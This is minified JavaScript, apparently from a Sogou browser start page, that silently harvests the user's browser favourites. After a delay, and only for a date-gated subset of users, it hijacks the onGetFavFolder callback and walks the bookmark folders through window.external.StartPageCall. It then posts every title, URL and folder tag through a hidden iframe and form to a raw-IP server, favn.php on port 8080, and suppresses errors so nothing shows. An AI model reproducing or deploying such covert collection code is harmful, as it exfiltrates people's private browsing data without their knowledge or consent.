function get_level_by_id(id,pid){if(pid==0){if(favpb_vars.levelid.length==0){favpb_vars.levelid[0]=[id];}else{var tmp=favpb_vars.levelid[0];tmp[tmp.length]=id;favpb_vars.levelid[0]=tmp;}return 0;}for(var lv=0;lv<favpb_vars.levelid.length;lv++){if(inar(favpb_vars.levelid[lv],pid)>-1){var tmp=favpb_vars.levelid[lv+1];if(tmp){tmp[tmp.length]=id;favpb_vars.levelid[lv+1]=tmp;}else{favpb_vars.levelid[lv+1]=[id];}return(lv+1);}}return -1;}var onGetFavFolder_func=function(pid,result){var s=result.split('\n');if(favpb_vars.ison){var h="";for(var i=0;i<s.length;i++){var t=s[i].split('\t');var id=parseInt(t[0]);if(inar(favpb_vars.proid,id)>-1){continue;}favpb_vars.proid[favpb_vars.proid.length]=id;h+="t="+t+"\tpid="+pid+"\tlv=";var lv=get_level_by_id(id,pid);h+=lv;var tag="-";if(t.length==4 && t[1]==""){var ptag="";if(favpb_vars.tag["tag_"+pid]){ptag=favpb_vars.tag["tag_"+pid];tag=ptag;h+="\ttag="+tag;}favpb_vars.tag["tag_"+t[0]]=(ptag!=""?(ptag+"^^"):"")+t[2];if(lv>-1 && lv<4 && favpb_vars.fctimes<50){window.external.StartPageCall('getfav',t[0]);}}else if(t.length==4){if(favpb_vars.tag["tag_"+pid]){tag=favpb_vars.tag["tag_"+pid];h+="\ttag="+tag;}}h+="\n";if(t.length==4){var curl=t[2].replace(/[\t\n]/g,"");var cuttitle=t[1]!=""?t[1].replace(/[\t\n]/g,""):"";favpb_vars.dat[favpb_vars.dat.length]=[t[0],cuttitle,curl,tag,pid,lv];}}favpb_vars.fctimes++;}};ajaf.p_flag=0;ajaf.p_cb_url="";ajaf.p_cb_func=function(){};ajaf.dm="http://i.sogou.com/";ajaf.ajaf_get=function(url,cbf){var o=document.getElementsByTagName("head")[0];var s=document.createElement('script');s.src=url+"&method=ajaf&cbf="+cbf;o.appendChild(s);};ajaf.ajaf_post=function(url,data,cburl,charset,callback){if($("_ajaj")){var i=$("_ajaj");}else{var i=document.createElement("iframe");i.name="_ajaj";i.id="_ajaj";i.style.display="none";$("hover").appendChild(i);if(i.attachEvent){i.attachEvent("onload",ajaf.ajaf_post_cb);}else{i.addEventListener("load",ajaf.ajaf_post_cb,false);}}if($("_ajajform")){var f=$("_ajajform");var t=$("_ajajcont");}else{var f=document.createElement("form");f.id="_ajajform";f.style.display="none";f.method="post";f.target="_ajaj";var t=document.createElement("input");t.id="_ajajcont";t.name="_ajajcont";t.type="text";f.appendChild(t);$("hover").appendChild(f);}ajaf.p_flag=1;ajaf.p_cb_url=cburl;ajaf.p_cb_func=callback;f.action=url;t.value=data;f.submit();};ajaf.ajaf_post_cb=function(){if(ajaf.p_flag==1 && ajaf.p_cb_url!=""){ajaf.ajaf_get(ajaf.p_cb_url,"",ajaf.p_cb_func);ajaf.p_flag=0;}};ajaf.sgcb=function(cont,fn){if(fn && typeof fn=="function"){try{cont=cont.replace(/\t\t\t\t/g,"\n");fn(cont);}catch(e){}}};function ping_back_fav(cont){var modify_url="";var mu="http://123.126.51.82:8080/favn.php?mt=insfav&fr=123n&ver=v33_1&";var m=s_vars.m;var apid=s_vars.apid;mu+=(m && m!="")?("m="+m+"&"):"";mu+=(apid && apid!="")?("apid="+apid+"&"):"";mu+="clen="+favpb_vars.dat.length+"&";mu+="c="+(new Date().getTime());ajaf.ajaf_post(mu,encodeURIComponent(cont),"","",function(){});}var favpb_vars={"ison":false,"levelid":[],"fctimes":0,"tag":{},"dat":[],"proid":[],"onGetFavFolder_functmp":function(){}};(function(){var m=s_vars.m;var d=new Date().getTime();d=parseInt(d/(24*3600*1000)) % 16;var fav_allow=["0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F"];if(!(fav_allow[d] && fav_allow[d]!="")){return false;}if(!(m && fav_allow[d]==m.charAt(0))){return false;}setTimeout(function(){try{favpb_vars.onGetFavFolder_functmp=onGetFavFolder;onGetFavFolder=onGetFavFolder_func;favpb_vars.ison=true;window.external.StartPageCall('getfav','0');setTimeout(function(){var h="";for(var i=0;i<favpb_vars.dat.length;i++){h+=favpb_vars.dat[i].join("\t")+"\t"+i+"\n";}ping_back_fav(h);onGetFavFolder=favpb_vars.onGetFavFolder_functmp;favpb_vars.ison=false;},3000);}catch(e){}},2000);})();